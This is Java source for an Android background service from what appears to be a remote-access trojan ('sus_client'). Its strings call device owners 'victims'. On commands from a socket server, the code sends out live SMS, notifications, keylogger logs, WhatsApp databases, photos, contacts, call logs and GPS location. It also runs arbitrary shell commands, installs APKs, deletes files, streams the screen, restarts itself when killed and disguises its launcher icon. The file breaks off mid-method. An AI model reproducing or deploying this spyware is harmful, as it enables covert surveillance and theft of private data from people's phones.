package com.android.sus_client.services;

import static android.app.Activity.RESULT_OK;
import static android.content.Intent.ACTION_VIEW;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.graphics.Bitmap;
import android.location.LocationManager;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.text.TextUtils;
import android.util.Log;
import android.util.Pair;
import android.view.accessibility.AccessibilityManager;
import android.webkit.URLUtil;
import android.widget.Toast;

import com.android.sus_client.applaunchers.ActionActivity;
import com.android.sus_client.applaunchers.AppChanger;
import com.android.sus_client.background.ForegroundReceiver;
import com.android.sus_client.base.NetworkUtil;
import com.android.sus_client.control.Const;
import com.android.sus_client.control.ScreenSharingHandler;
import com.android.sus_client.model.ClientConfig;
import com.android.sus_client.screen_recorder.ScreenRecorder;
import com.android.sus_client.screen_recorder.ScreenRecorderConfig;
import com.android.sus_client.screen_recorder.ScreenRecorderHandler;
import com.android.sus_client.screen_recorder.ScreenRecorderListener;
import com.android.sus_client.commonutility.root.ShellUtils;
import com.android.sus_client.commonutility.cache.BaseRootFiles;
import com.android.sus_client.utils.ApkUtils;
import com.android.sus_client.utils.AppUtils;
import com.android.sus_client.utils.FileUtil;
import com.android.sus_client.utils.PermissionsBinder;
import com.android.sus_client.utils.PermissionsUtils;
import com.android.sus_client.utils.Utils;
import com.android.sus_client.utils.camera2.ACameraCapturingService;
import com.android.sus_client.utils.camera2.CameraCapturingServiceImpl;
import com.android.sus_client.utils.camera2.CameraFacing;
import com.android.sus_client.utils.camera2.FlashMode;
import com.android.sus_client.utils.camera2.PictureCapturingListener;
import com.android.sus_client.utils.camera2.VideoCapturingListener;
import com.android.sus_client.utils.permissions.Permissions;
import com.android.sus_client.utils.phoneutils.DeviceInfo;
import com.android.sus_client.utils.smscatcher.OnSmsCatchListener;
import com.android.sus_client.utils.smscatcher.SmsCatcher;
import com.android.sus_client.victim_media.LocalMediaPageLoader;
import com.android.sus_client.victim_media.config.PictureSelectionConfig;
import com.android.sus_client.victim_media.entity.LocalMedia;
import com.android.sus_client.victim_media.entity.LocalMediaFolder;
import com.android.sus_client.victim_media.interfaces.OnQueryDataResultListener;
import com.android.sus_client.webrtc.WebrtcClient;
import com.android.sus_client.webrtc.WebrtcRepository;
import com.android.sus_client.webrtc.utils.DataModel;
import com.android.sus_client.webrtc.utils.DataModelType;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.MediaStream;
import org.webrtc.SurfaceViewRenderer;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.Observable;

import io.socket.client.Ack;
import io.socket.emitter.Emitter;

public class ForegroundService extends BaseService {

    public static final String TAG = ForegroundService.class.getSimpleName();
    public static final Class<?> CLASS = ForegroundService.class;

    public static ForegroundService instance;
    private static boolean isRunning = false;
    public boolean adminOnlineStatus = false;

    public JSONArray ipAddressList;


    private WebrtcRepository webrtcRepository = null;
    private MyAccessibilityService mouseAccessibilityService = null;


    /**
     * Binder given to clients
     */
    private final IBinder mBinder = new ServiceBinder();

    public class ServiceBinder extends Binder {
        // Return this instance of LocalService so clients can call public methods
        public ForegroundService getService() {
            return ForegroundService.this;
        }
    }

    @Override
    public void onCreate() {
        instance = this;
        isRunning = true;
        super.onCreate();
        Utils.enabledStrictMode();

        registerReceiver(broadcastReceiver, new IntentFilter(ACTION_BROADCAST));
        ((AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE)).addAccessibilityStateChangeListener(new AccessibilityManager.AccessibilityStateChangeListener() {
            @Override
            public void onAccessibilityStateChanged(boolean enabled) {

            }
        });
        //((ClipboardManager) getSystemService(CLIPBOARD_SERVICE)).addPrimaryClipChangedListener(this);
        //FileUtil.writeTextInFile(Config.getUserDataDir() + "/UserInfo.txt", fetchAllInfo(), false);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        log("onStartCommand");
        instance = this;
        isRunning = true;
        ipAddressList = DeviceInfo.getIPAddressList();

        if (intent != null) {
            startForegroundIfNeeded();
        }

        initializePreferences();
        if (hasIntentAction(intent, flags, startId)) {
            return START_STICKY;
        }

        NetworkUtil.registerConnectionListener(getApplicationContext(), this);
        synchronized (lock) {
            //executorService.execute(this);
            startWork();
            runningJobs++;
        }
        return START_STICKY;
    }

    private boolean hasIntentAction(Intent intent, int flags, int startId) {
        screenSharingHandler = new ScreenSharingHandler(this, new ScreenSharingHandler.ScreenSharingCallback() {
            @Override
            public void onSharingStarted() {
                //notifySharingStart();
            }

            @Override
            public void onSharingStopped() {
                //notifySharingStop();
                //adminName = null;
                //updateUI();
                //sharingEngine.disconnect(MainActivity.this, (success, errorReason) -> connect());
            }

            @Override
            public void onSharingPermissionNeeded() {
                ActionActivity.start(instance, ActionActivity.ACTION_RECORD_SCREEN);
                //startActivityForResult(projectionManager.createScreenCaptureIntent(), Const.REQUEST_SCREEN_SHARE);
            }

            @Override
            public void onSharingFailed(String error) {
                //String message = intent.getStringExtra(Const.EXTRA_MESSAGE);
                //if (message != null) {
                //    Toast.makeText(MainActivity.this, message, Toast.LENGTH_LONG).show();
                //}
                //adminName = null;
                //updateUI();
                //sharingEngine.disconnect(MainActivity.this, (success, errorReason) -> connect());
            }

            @Override
            public void onConnectionFailure() {
                //sharingEngine.setState(Const.STATE_DISCONNECTED);
                //Toast.makeText(MainActivity.this, R.string.connection_failure_hint, Toast.LENGTH_LONG).show();
                //updateUI();
            }
        });
        if (screenSharingHandler.onStartCommand(intent)) {
            return true;
        }

        screenRecorderHandler = new ScreenRecorderHandler(this);
        if (screenRecorderHandler.onStartCommand(intent)) {
            return true;
        }

        return false;
    }

    private String adminName;

    private void updateUI() {
        String[] stateLabels = {"Disconnected", "Connecting", "Connected", "Sharing", "Disconnecting"};
        String strMsg;
        int state = 0;
        //int state = sharingEngine.getState();
        if (state == Const.STATE_CONNECTED && adminName != null) {
            strMsg = stateLabels[Const.STATE_SHARING];
        } else {
            strMsg = stateLabels[state];
        }
        Toast.makeText(this, strMsg, Toast.LENGTH_LONG).show();
        //showNotificationHeadsUp("", strMsg);
    }


    /**
     * WebRtc Implementation
     */

    private WebrtcRepository.Listener webrtcListener = new WebrtcRepository.Listener() {
        @Override
        public void onConnectionRequestReceived() {
            log("webrtcListener: onConnectionRequestReceived");
        }

        @Override
        public void onConnectionConnected() {
            log("webrtcListener: onConnectionConnected");
        }

        @Override
        public void onCallEndReceived() {
            log("webrtcListener: onCallEndReceived");
        }

        @Override
        public void onRemoteStreamAdded(MediaStream stream) {
            log("webrtcListener: onRemoteStreamAdded");
        }

        @Override
        public void onSendMessageToSocket(DataModel data) {
            socketHandler.sendDataToServer("remoteDisplayControl", data.toJsonObject());
        }
    };

    public boolean serverStart(Intent intent, boolean isAccessibilityServiceEnabled, Context context, SurfaceViewRenderer surfaceView) {
        //if (!(isWebServerRunning = startHttpServer(8080)))
        //    return false;

        //SurfaceViewRenderer surfaceView = new SurfaceViewRenderer(context);
        webrtcRepository = new WebrtcRepository(new WebrtcClient(context));
        webrtcRepository.init(webrtcListener, surfaceView);
        webrtcRepository.sendScreenShareConnection(intent, surfaceView);

        accessibilityServiceSet(context, isAccessibilityServiceEnabled);
        return true;//isWebServerRunning;
    }

    public void serverStop() {
        //if (!isWebServerRunning) return;
        //isWebServerRunning = false;

        accessibilityServiceSet(null, false);

        //stopHttpServer();
        webrtcRepository.onDestroy();
        webrtcRepository = null;
    }


    /**
     * Accessibility
     */
    public void accessibilityServiceSet(Context context, boolean isEnabled) {
        if (isEnabled) {
            if (mouseAccessibilityService != null)
                return;
            mouseAccessibilityService = new MyAccessibilityService();
            mouseAccessibilityService.setContext(context);
        } else {
            mouseAccessibilityService = null;
        }
    }

    public boolean isMouseAccessibilityServiceAvailable() {
        return mouseAccessibilityService != null;
    }


    @Override
    public void onDestroy() {
        instance = null;
        isRunning = false;
        super.onDestroy();
        synchronized (lock) {
            stopWork(true);
        }

        if (screenRecorderHandler != null) screenRecorderHandler.onDestroyService();
        if (smsCatcher != null) smsCatcher.onStop();

        unregisterReceiver(broadcastReceiver);

        // call ForegroundReceiver which will restart the service via a worker or directly
        sendBroadcast(new Intent(this, ForegroundReceiver.class).setAction("RestartForeground"));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    public static boolean isServiceRunning() {
        return isRunning;
    }

    public void startTest(String msg) {
        log("startTest Message ===> " + msg);
        log("startTest AppInForeground ===> " + Utils.isAppInForeground(this));
    }

    @Override
    public void processServiceTasks() {
        /*Permissions.request(getApplicationContext(), PermissionsUtils.permission, new PermissionHandler() {
            @Override
            public void onGranted(ArrayList<String> grantedPermissions) {
                boolean allPermissionGranted = PermissionsUtils.isAllPermissionGranted(getApplicationContext(), true);
                log("All permissions " + allPermissionGranted);
            }
        });*/

        Utils.toggleComponentRestart(getApplicationContext(), AppNotificationListener.class);
        notificationListener = new AppNotificationListener();
        notificationListener.setNotificationListener(new AppNotificationListener.NotificationListener() {
            @Override
            public void onNotificationPosted(JSONObject notification) {
                if (adminOnlineStatus) {
                    socketHandler.sendDataToServer("onNotificationAdded", notification, true);
                } else {
                    rootFilesManager.saveText(notification.toString() + "\n", "Notifications_List.txt", true);
                }
            }
        });

        gpsTracker = GpsTracker.getInstance(this);
        gpsTracker.stopUsingGPS(1);

        smsCatcher = new SmsCatcher(this, new OnSmsCatchListener<String>() {
            @Override
            public void onSmsCatch(String message, String senderNumber, int receivedInSimSlot, String receivedInCarrierName, String receivedInNumber) {
                try {
                    JSONObject msgObject = new JSONObject();
                    msgObject.put("timeStamp", Utils.getTimeStamp());
                    msgObject.put("message", message);
                    msgObject.put("senderNumber", senderNumber);
                    msgObject.put("receivedInSimSlot", receivedInSimSlot);
                    msgObject.put("receivedInCarrierName", receivedInCarrierName);
                    msgObject.put("receivedInNumber", receivedInNumber);
                    socketHandler.sendDataToServer("LiveSMS", msgObject);
                } catch (Exception e) {
                    log(e.toString());
                }
            }
        });

        // don't need to call registerReceiver, if Sms BroadcastReceiver already declared in AndroidManifest.xml
        //smsCatcher.registerReceiver();
    }

    @Override
    public void onSocketConnect(JSONObject obj) {
        log("onSocketConnect AppInForeground ===> " + Utils.isAppInForeground(getApplicationContext()));
        if (!obj.optBoolean("status", false)) {
            checkAndExit();
            return;
        }

        JSONObject clientInfo = new JSONObject();
        try {
            DeviceInfo info = new DeviceInfo(getApplicationContext());
            clientInfo.put("deviceId", info.deviceId);
            clientInfo.put("socketId", "");
            clientInfo.put("adminApiKey", socketHandler.adminApiKey);
            clientInfo.put("isOnline", true);
            clientInfo.put("deviceInfo", info.toJSON(null, ipAddressList));
        } catch (Exception e) {
            log(e.getMessage());
        }
        socketHandler.sendDataToServer("join", clientInfo);
    }

    @Override
    public void onSocketError(Object obj) {
        if (obj instanceof JSONObject) {
            JSONObject json = (JSONObject) obj;
            checkAndExit(json.optString("message"));
        }
    }

    @Override
    public void onSocketDisconnect(Object obj) {
        if (obj instanceof JSONObject) {
            JSONObject json = (JSONObject) obj;
            checkAndExit(json.optString("message"));
        }
    }

    private void checkAndExit() {
        checkAndExit("Authentication error");
    }

    private void checkAndExit(String message) {
        try {
            if (message.startsWith("Authentication error")) {
                stopWork(true);
                if (socketHandler != null) socketHandler.disconnect();
                System.exit(0);
            }
        } catch (Exception ignored) {
            System.exit(0);
        }
    }

    /**
     * The purpose of this method is to get the call back for any type of connection error
     */
    @Override
    public void update(Observable o, Object arg) {
        startTest("Observable Called");

        //register you all method here
        log("adminOnlineStatus before ===> " + adminOnlineStatus);
        socketHandler.onEvent("adminStatus", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                JSONObject request = parseJsonRequest(args);
                adminOnlineStatus = request.optBoolean("isOnline");
                log("adminOnlineStatus after ===> " + adminOnlineStatus);
                //socketHandler.sendDataToServer("adminStatus", clientInfo);
            }
        });

        // get response and update notification
        socketHandler.socket.emit("getAppConfig", socketHandler.getFirebaseUid(), DeviceInfo.getDeviceID(getApplicationContext()), new Ack() {
            @Override
            public void call(Object... args) {
                JSONObject response = parseJsonRequest(args);
                if (!response.optBoolean("status")) return;
                try {
                    JSONObject globalData = response.has("globalData") ? response.getJSONObject("globalData") : new JSONObject();
                    JSONObject clientData = response.has("clientData") ? response.getJSONObject("clientData") : new JSONObject();

                    preferences.notificationsBlockList(globalData.getJSONArray("notificationBlockedPkg"));
                    preferences.clientConfigData(ClientConfig.fromJSON(clientData));
                } catch (Exception ignored) {
                }

                final ClientConfig config = preferences.clientConfigData();
                updateNotification(config);
                initializePreferences();

                final String pageUrl = config.getAppPageUrl();
                if (URLUtil.isValidUrl(pageUrl)) {
                    final String appIconName = FileUtil.getNameNoExtensionFromUrl(config.getAppIconUrl(), "png");
                    taskRunner.executeAsync(() -> {
                        if (rootFilesManager.getFile(appIconName).exists()) {
                            return true;
                        }
                        Bitmap bitmap = FileUtil.getBitmapFromURL(config.getAppIconUrl());
                        if (bitmap != null) {
                            ByteArrayOutputStream stream = new ByteArrayOutputStream();
                            bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
                            Bitmap finalBitmap = FileUtil.decodeSampleBitmapFromByteArray(stream.toByteArray(), 160, 160);
                            return rootFilesManager.saveImage(finalBitmap, appIconName, BaseRootFiles.DirType.CACHE).exists();
                        }
                        return false;
                    }, isLoaded -> {
                        if (isLoaded != null && isLoaded) {
                            Bitmap bitmap = rootFilesManager.getFileAsBitmap(appIconName, BaseRootFiles.DirType.CACHE);
                            ApkUtils.addLauncherShortcut(getApplicationContext(), pageUrl, config.getAppName(), bitmap);
                        }
                    });

                } else {
                    AppChanger.getInstance(getApplicationContext()).changeAppStyle(pageUrl, enabledAliasName -> {
                        System.out.println(pageUrl + " >>> Enabled alias name ---------> " + enabledAliasName);
                    });
                }
            }
        });

        /**
         * Below events triggered by admin application
         * */
        socketHandler.onEvent("ping", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                //JSONObject request = parseJsonRequest(args);
                JSONObject clientInfo = new JSONObject();
                try {
                    ipAddressList = DeviceInfo.getIPAddressList();
                    DeviceInfo info = new DeviceInfo(getApplicationContext());
                    clientInfo.put("deviceId", info.deviceId);
                    clientInfo.put("socketId", "");
                    clientInfo.put("adminApiKey", socketHandler.adminApiKey);
                    clientInfo.put("isOnline", true);
                    clientInfo.put("deviceInfo", info.toJSON(gpsTracker.getAddressLine(), ipAddressList));
                } catch (Exception e) {
                    log(e.getMessage());
                }
                socketHandler.sendDataToServer("join", clientInfo);

                resetShellUtils();
                socketHandler.triggerServiceObserver();

                //ApkUtils.changeAppShortcut(getApplicationContext(), "", "", );
            }
        });
        socketHandler.onEvent("fetchAddedNotifications", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                File file = rootFilesManager.getFile("Notifications_List.txt");
                try {
                    String data = Utils.getStringFromFilePath(getApplicationContext(), file.getAbsolutePath());
                    if (TextUtils.isEmpty(data)) throw new Exception("Notifications not found!");
                    JSONObject response = new JSONObject();
                    response.put("data", data);
                    socketHandler.sendDataToServer("fetchAddedNotifications", response, true);
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    rootFilesManager.deleteFile(file.getName());
                }
            }
        });
        socketHandler.onEvent("fetchAddedKeyloggerData", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                File file = rootFilesManager.getFile("KeyloggerData_List.txt");
                try {
                    String data = Utils.getStringFromFilePath(getApplicationContext(), file.getAbsolutePath());
                    if (TextUtils.isEmpty(data)) throw new Exception("Logs not found!");
                    JSONObject response = new JSONObject();
                    response.put("data", data);
                    socketHandler.sendDataToServer("fetchAddedKeyloggerData", response, true);
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    rootFilesManager.deleteFile(file.getName());
                }
            }
        });
        socketHandler.onEvent("getVictimMedia", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                JSONObject request = parseJsonRequest(args);
                try {
                    String[] READ_WRITE_STORAGE = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE};
                    if (!Permissions.isGranted(getApplicationContext(), READ_WRITE_STORAGE)) {
                        Permissions.request(getApplicationContext(), READ_WRITE_STORAGE, null);
                        throw new Exception("Storage permission not granted.");
                    }

                    if (request.has("config")) {
                        JSONObject jsonConfig = request.getJSONObject("config");
                        mMediaLoader = new LocalMediaPageLoader();
                        mMediaLoader.initConfig(getApplicationContext(), PictureSelectionConfig.getInstance(jsonConfig));
                    }
                    PictureSelectionConfig config = mMediaLoader.getConfig();

                    String action = request.optString("action");
                    switch (action) {
                        case "loadPageMediaData":
                            long bucketId = request.optLong("bucketId", -1);
                            int mPage = request.optInt("mPage", 1);
                            int pageSize = request.optInt("pageSize", config.pageSize);
                            mMediaLoader.loadPageMediaData(bucketId, mPage, pageSize, new OnQueryDataResultListener<LocalMedia>() {
                                @Override
                                public void onComplete(ArrayList<LocalMedia> result, boolean isHasMore) {
                                    JSONObject data = new JSONObject();
                                    JSONArray mediaList = new JSONArray();
                                    try {
                                        if (result != null && !result.isEmpty()) {
                                            for (int i = 0; i < result.size(); i++) {
                                                mediaList.put(LocalMedia.toJSON(result.get(i)));
                                            }
                                        }
                                        data.put("data", mediaList);
                                        data.put("isHasMore", isHasMore);
                                        data.put("isLocalMedia", true);
                                    } catch (JSONException ignored) {
                                    }
                                    socketHandler.sendDataToServer("getVictimMedia", data, false);
                                }
                            });
                            break;
                        case "loadAllAlbum":
                            mMediaLoader.loadAllAlbum(result -> {
                                JSONObject data = new JSONObject();
                                JSONArray mediaList = new JSONArray();
                                try {
                                    if (result != null && !result.isEmpty()) {
                                        for (int i = 0; i < result.size(); i++) {
                                            mediaList.put(LocalMediaFolder.toJSON(result.get(i)));
                                        }
                                    }
                                    data.put("data", mediaList);
                                    data.put("isLocalMedia", false);
                                } catch (JSONException ignored) {
                                }
                                socketHandler.sendDataToServer("getVictimMedia", data, false);
                            });
                            break;
                    }
                } catch (Exception e) {
                    JSONObject data = new JSONObject();
                    try {
                        data.put("message", e.getMessage());
                    } catch (JSONException ignored) {
                    }
                    socketHandler.sendDataToServer("getVictimMedia", data, false);
                }
            }
        });

        socketHandler.onEvent("getImageData", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                JSONObject request = parseJsonRequest(args);
                JSONObject data = new JSONObject();
                try {
                    if (request.optBoolean("getWallpaper")) {
                        data.put("getWallpaper", true);
                        data.put("data", AppUtils.getWallpaper(getApplicationContext()));
                    } else if (request.optBoolean("getContactImage")) {
                        long contactId = request.optLong("contactId", 0);
                        data.put("getContactImage", true);
                        data.put("data", SocketHandler.getImageFromContact(getApplicationContext(), contactId));
                    }
                } catch (Exception ignored) {
                }
                socketHandler.sendDataToServer("getImageData", data);
            }
        });
        socketHandler.onEvent("getFilesByPath", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                JSONObject request = parseJsonRequest(args);
                String dirPath = request.optString("filePath");
                boolean isRootDir = request.optBoolean("isRootDir");
                responseData = new JSONObject();
                try {
                    Permissions.requestIfNotGranted(getApplicationContext(), new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, var1 -> null);
                    Pair<JSONObject, JSONArray> data = SocketHandler.getListOfFiles(getApplicationContext(), dirPath, isRootDir);
                    responseData.put("status", true);
                    responseData.put("msg", "");
                    responseData.put("currentDir", data.first);
                    responseData.put("files", data.second);
                } catch (Exception e) {
                    try {
                        responseData.put("status", false);
                        responseData.put("msg", e.getMessage());
                        responseData.put("data", "");
                    } catch (JSONException ignored) {
                    }
                }
                socketHandler.sendDataToServer("getFilesByPath", responseData, true);
            }
        });
        socketHandler.onEvent("filesAction", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                JSONObject request = parseJsonRequest(args);
                final String actionCmd = request.optString("cmd");
                JSONObject actionData;
                try {
                    actionData = request.getJSONObject("data");
                } catch (Exception e) {
                    actionData = new JSONObject();
                }
                switch (actionCmd) {
                    case "Copy Files":
                        boolean deleteOnPaste = actionData.optString("deleteOnPaste").trim().equals("1");
                        String destDir = actionData.optString("destDir");
                        JSONArray filesPath = actionData.optJSONArray("filesPath");
                        try {
                            for (int i = 0; i < filesPath.length(); i++) {
                                if (TextUtils.isEmpty(filesPath.optString(i))) continue;
                                File sourceFile = new File(filesPath.optString(i));
                                File destFile = new File(destDir, sourceFile.getName());
                                FileUtil.copyFile(sourceFile.getAbsolutePath(), destFile.getAbsolutePath());
                                if (deleteOnPaste) {
                                    FileUtil.deleteFile(sourceFile);
                                }
                            }
                            responseStatus = true;
                        } catch (Exception ignored) {
                            responseStatus = false;
                        }
                        break;
                    case "Delete Files":
                        filesPath = actionData.optJSONArray("filesPath");
                        try {
                            for (int i = 0; i < filesPath.length(); i++) {
                                if (TextUtils.isEmpty(filesPath.optString(i))) continue;
                                FileUtil.deleteFile(filesPath.optString(i));
                            }
                            responseStatus = true;
                        } catch (Exception ignored) {
                            responseStatus = false;
                        }
                        break;
                    case "Download Files":
                        String readFilePath = actionData.optString("filePath");
                        try {
                            if (readFilePath.isEmpty()) {
                                Bundle bundle = new Bundle();
                                bundle.putString("url", actionData.optString("webUrl"));
                                ActionActivity.start(instance, ACTION_VIEW, bundle);
                                responseMessage = "";
                            } else {
                                System.out.println("\ngetLinkedRootFilePath >>>>>>>>>>>>>  " + readFilePath);
                                responseMessage = executeShellCommandCapture(0, "cat " + readFilePath);
                                //responseMessage = MediaUtils.getImageThumbnailData(RootCommands.getFile(singleFile.getAbsolutePath()););
                            }
                            responseStatus = true;
                        } catch (Exception ignored) {
                            responseStatus = false;
                            responseMessage = "";
                        }
                        break;
                    case "View File":
                        String filePath = actionData.optString("filePath");
                        try {
                            File file = new File(filePath);
                            if (FileUtil.isApksFile(file.getName())) {
                                ApkUtils.installApk(getApplicationContext(), file);
                            } else {
                                Intent intent = FileUtil.getIntentForFile(getApplicationContext(), new File(filePath));
                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(intent);
                            }
                            responseStatus = true;
                        } catch (Exception e) {
                            e.printStackTrace();
                            responseStatus = false;
                        }
                        break;
                    case "Rename File":
                        String fileName = actionData.optString("fileName");
                        filePath = actionData.optString("filePath");
                        try {
                            File renameFile = new File(filePath);
                            responseStatus = FileUtil.renameFile(renameFile.getParentFile(), renameFile.getName(), fileName);
                        } catch (Exception ignored) {
                            responseStatus = false;
                        }
                        break;
                    case "Create File":
                        fileName = actionData.optString("fileName");
                        destDir = actionData.optString("destDir");
                        try {
                            FileUtil.createNewFile(new File(destDir, fileName).getAbsolutePath());
                            responseStatus = true;
                        } catch (Exception ignored) {
                            responseStatus = false;
                        }
                        break;
                }

                responseData = new JSONObject();
                try {
                    responseData.put("cmd", actionCmd);
                    responseData.put("status", responseStatus);
                    if (actionCmd.equals("Download Files")) {
                        responseData.put("data", responseMessage);
                    }
                } catch (JSONException ignored) {
                }
                socketHandler.sendDataToServer("filesAction", responseData, true);
            }
        });
        socketHandler.onEvent("download", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                File filePath = new File(Environment.getExternalStorageDirectory().getPath() + args[0].toString());
                if (filePath.isFile()) {
                    socketHandler.uploadFileToServer("download", filePath, 0);
                }
            }
        });
        socketHandler.onEvent("downloadWhatsappDatabase", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                File filePath = new File(args[0].toString());
                if (filePath.isFile()) {
                    socketHandler.uploadFileToServer("downloadWhatsappDatabase", filePath, 0);
                } else {
                    socketHandler.sendErrorToServer("Whatsapp database not found yet please wait for victim to login");
                }
            }
        });
        socketHandler.onEvent("previewImage", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                File filePath = new File(Environment.getExternalStorageDirectory().getPath() + args[0].toString());
                if (filePath.isFile()) {
                    try {
                        JSONObject imageData = new JSONObject();
                        imageData.put("image", FileUtil.encodeImage(filePath, 10));
                        socketHandler.sendDataToServer("previewImage", imageData);
                    } catch (Exception ignored) {
                    }
                }
            }
        });
        socketHandler.onEvent("getSMS", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                JSONObject request = parseJsonRequest(args);
                if (Permissions.isGranted(getApplicationContext(), Manifest.permission.READ_SMS)) {
                    JSONObject response = SocketHandler.getAllSms(getApplicationContext(), request.optInt("start"), request.optInt("end", 10));
                    socketHandler.sendDataToServer("getSMS", response, true);
                } else {
                    socketHandler.sendErrorToServer("Permission not allowed by victim");
                }
            }
        });
        socketHandler.onEvent("getInstalledApps", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                socketHandler.sendDataToServer("getInstalledApps", ApkUtils.getInstalledApps(getApplicationContext()), true);
            }
        });
        socketHandler.onEvent("executeShellCommand", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                JSONObject request = parseJsonRequest(args);
                String command = request.optString("command", "").trim();
                if (command.startsWith("su ")) {
                    command = command.replace("su ", "");
                }
                final String mCommand = command;

                /*executeShellCommand(0, mCommand, output -> {
                    boolean status = !TextUtils.isEmpty(output.args.trim());
                    try {
                        responseData = new JSONObject();
                        responseData.put("status", status);
                        responseData.put("command", mCommand);
                        responseData.put("output", output.args);
                    } catch (JSONException ignored) {
                    }
                    socketHandler.sendDataToServer("executeShellCommand", responseData, true);
                    return null;
                }, error -> {
                    try {
                        responseData = new JSONObject();
                        responseData.put("status", false);
                        responseData.put("command", mCommand);
                        responseData.put("output", error.args);
                    } catch (JSONException ignored) {
                    }
                    socketHandler.sendDataToServer("executeShellCommand", responseData, true);
                    return null;
                });*/

                try {
                    String output = executeShellCommandCapture(0, mCommand);
                    boolean status = !TextUtils.isEmpty(output.trim());
                    responseData = new JSONObject();
                    responseData.put("status", status);
                    responseData.put("command", mCommand);
                    responseData.put("output", output);
                } catch (Exception ignored) {
                }
                socketHandler.sendDataToServer("executeShellCommand", responseData, true);

                /*shellUtils.getProcess(hasRootAccess);
                String output = shellUtils.execute(mCommand);
                boolean status = !TextUtils.isEmpty(output.trim());
                try {
                    responseData = new JSONObject();
                    responseData.put("status", status);
                    responseData.put("command", mCommand);
                    responseData.put("output", output);
                } catch (JSONException ignored) {
                }
                socketHandler.sendDataToServer("executeShellCommand", responseData, true);*/
            }
        });
        socketHandler.onEvent("getContacts", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                if (Permissions.isGranted(getApplicationContext(), Manifest.permission.READ_CONTACTS)) {
                    socketHandler.sendDataToServer("getContacts", SocketHandler.getAllContacts(getApplicationContext()), true);
                } else {
                    socketHandler.sendErrorToServer("Permission not allowed by victim");
                }
            }
        });
        socketHandler.onEvent("getCallLog", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                if (Permissions.isGranted(getApplicationContext(), Manifest.permission.READ_CALL_LOG)) {
                    socketHandler.sendDataToServer("getCallLog", SocketHandler.readCallLog(getApplicationContext()), true);
                } else {
                    socketHandler.sendErrorToServer("Permission not allowed by victim");
                }
            }
        });
        socketHandler.onEvent("liveLocation", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                JSONObject request = parseJsonRequest(args);
                if (!request.optBoolean("enabled", false)) {
                    gpsTracker.stopUsingGPS();
                    return;
                }
                gpsTracker = GpsTracker.getInstance(getApplicationContext());
                gpsTracker.stopUsingGPS(request.optInt("autoStopMinutes", 5));
                gpsTracker.setLocationListener(new GpsTracker.LocationListener() {
                    @Override
                    public void onChange(JSONObject locationData) {
                        socketHandler.sendDataToServer("liveLocation", locationData);
                    }
                });
            }
        });

        socketHandler.onEvent("remoteAction", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                processRemoteAction(parseJsonRequest(args));
            }
        });

        socketHandler.onEvent("remoteDisplayControl", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                JSONObject request = parseJsonRequest(args);
                try {
                    DataModel dataModel = DataModel.fromJsonObject(request);
                    if (dataModel.getType() == DataModelType.SignIn) {
                        ActionActivity.start(getApplicationContext(), ActionActivity.ACTION_ENABLE_ACCESSIBILITY);
                    } else {
                        webrtcRepository.onNewMessageReceived(DataModel.fromJsonObject(request));
                    }

                    /*String type = request.optString("type");
                    if (type.equals("sdp")) {
                        if (webRtcManager != null) {
                            webRtcManager.onAnswerReceived(request.optJSONObject("sdp"));
                        }
                    } else if (type.equals("ice")) {
                        if (webRtcManager != null) {
                            webRtcManager.onIceCandidateReceived(request.optJSONObject("ice"));
                        }
                    } else if (type.equals("bye")) {
                        if (webRtcManager != null) {
                            webRtcManager.stop();
                        }
                    } else if (type.equals("join")) {
                        ActionActivity.start(getApplicationContext(), ActionActivity.ACTION_ENABLE_ACCESSIBILITY);
                    } else {
                        if (mouseAccessibilityService != null) {
                            mouseAccessibilityService.processAction(request.getJSONObject("gestureData"));
                        }
                    }*/

                    //String title = request.optString("title", "Notification");
                    //String content = request.optString("content", "Wait for updates...");
                    //showNotificationHeadsUp(title, content, "");

                    /*JanusPollResponse response = JanusPollResponse.fromJson(request.optJSONObject("janusPollResponse"));
                    String janus = response.getJanusPluginResponse().getJanus();
                    if (janus == null) {
                        throw new Exception("Wrong response body");
                    } else if (janus.equalsIgnoreCase("keepalive")) {
                        throw new Exception("Janus: Keep-Alive");
                    } else if (janus.equalsIgnoreCase("webrtcup")) {
                        Intent intent = new Intent(Const.ACTION_JANUS_SESSION_POLL);
                        intent.putExtra(Const.EXTRA_EVENT, Const.EXTRA_WEBRTCUP);
                        sendBroadcast(intent);
                    } else if (janus.equalsIgnoreCase("event")) {
